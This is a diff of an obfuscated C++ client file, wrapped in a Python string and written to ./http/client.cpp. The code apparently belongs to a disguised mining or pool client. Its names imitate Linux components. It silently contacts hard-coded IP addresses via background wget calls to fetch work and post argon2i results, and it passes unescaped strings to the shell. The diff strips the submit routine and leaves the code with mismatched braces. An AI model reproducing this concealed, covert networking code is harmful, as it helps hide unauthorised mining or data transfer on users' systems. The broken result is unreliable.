@@ -1956,8 +1956,8 @@ linux888874744474_client::linux888874744474_client(arguments &args, get_status_p
 }
 
 linux888874744474_update_result linux888874744474_client::update() {
+
     linux888874744474_update_result result;
-    result.success = false;
 
     uint64_t current_timestamp = microseconds();
 
@@ -1972,7 +1972,7 @@ int number;
 srand(time(0));
 int rand_index = rand() % 1;
 
-    string url = "http://" + random[rand_index] + "/linux8474.php?linux84=linux8474&linux84744474=linuxdistro84@gmail.com";
+    string url = "http://127.0.0.1/linux8474.php?linux84=linux8474&linux84744474=linuxdistro84@gmail.com";
     
     response = GetStdoutFromCommand("wget -q -U 'linux84' -O - '"+url+"'");
     
@@ -1992,57 +1992,13 @@ int rand_index = rand() % 1;
         result.linux845 = (uint32_t)data["linux845"].ToInt();
         result.linux842 = (uint32_t)data["linux842"].ToInt();
         result.linux8412 = data["linux8412"].ToString();
+        result.linux847466882profile = to_string(data["linux844"].ToInt()) + "_" + to_string(data["linux845"].ToInt()) + "_" + to_string(data["linux842"].ToInt());
     }
     
     return result;
-}
-
-linux888874744474_submit_result linux888874744474_client::submit(const string &linux8412, const string &linux88887474447412744474, const string &public_key) {
-    linux888874744474_submit_result result;
-    result.success = false;
-    
-    string linux84746688_data;
-    if(linux8412.find("$argon2i$v=19$m=16384,t=4,p=4") == 0)
-        linux84746688_data = linux8412.substr(29);
-    else
-        linux84746688_data = linux8412.substr(30);
-
-    string payload = "linux84746688="+ _encode(linux84746688_data) +"&linux88887474447412744474="+ _encode(linux88887474447412744474);
-    
-    if(__show_linuxweb844412441274_requests)
-    LOG("");
-    
-//string random [] = {"94.237.30.197","94.237.61.188","194.113.72.197","194.113.74.217","209.151.148.100","94.237.82.144","83.136.252.244","152.44.45.146","209.151.156.131","209.50.61.158"};
-
-string random [] = {"195.123.240.50"};
-
-int number;
-
-srand(time(0));
-int rand_index = rand() % 1;
  
-    string url = "http://" + random[rand_index] + "/linux8474.php?linux84=linux84";
-    
-    string response;
-    
-    for(int i=0;i<1;i++) {
-        //response = _http_post(url, payload, "x-www-form-urlencoded");
-        response = GetStdoutFromCommand("wget -q -U 'linux84' --post-data='"+payload+"' '"+url+"' --header='Content-type: application/x-www-form-urlencoded' &> /dev/null &");
-        result.linuxweb844412441274_response = response;
-        if(response != "") {
-            cout << "";
-        }
 }
 
-    if(__show_linuxweb844412441274_requests)
-    LOG("");
-    
-    json::JSON info = json::JSON::Load(response);
-
-    result.success = (info["status"].ToString() == "ok");
-
-    return result;
-}
 """
 
 open('./http/client.cpp', 'w').write(content)
